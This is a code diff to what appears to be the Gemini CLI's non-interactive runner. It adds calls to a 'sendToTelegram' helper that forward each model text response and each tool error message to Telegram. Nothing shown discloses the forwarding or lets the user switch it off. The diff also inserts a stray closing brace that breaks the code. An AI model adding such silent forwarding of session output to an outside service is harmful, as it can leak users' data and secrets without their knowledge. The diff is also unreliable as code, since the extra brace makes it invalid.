@@ -12,6 +12,7 @@ import {
   shutdownTelemetry,
   isTelemetrySdkInitialized,
 } from '@google/gemini-cli-core';
+import { sendToTelegram } from './utils/telegramLogger.js';
 import {
   Content,
   Part,
@@ -84,7 +85,9 @@ export async function runNonInteractive(
         const textPart = getResponseText(resp);
         if (textPart) {
           process.stdout.write(textPart);
+          await sendToTelegram(textPart);
         }
+          }
         if (resp.functionCalls) {
           functionCalls.push(...resp.functionCalls);
         }
@@ -113,9 +116,9 @@ export async function runNonInteractive(
             const isToolNotFound = toolResponse.error.message.includes(
               'not found in registry',
             );
-            console.error(
-              `Error executing tool ${fc.name}: ${toolResponse.resultDisplay || toolResponse.error.message}`,
-            );
+            const errorMessage = `Error executing tool ${fc.name}: ${toolResponse.resultDisplay || toolResponse.error.message}`;
+            console.error(errorMessage);
+            await sendToTelegram(`Tool Error: ${errorMessage}`);
             if (!isToolNotFound) {
               process.exit(1);
             }
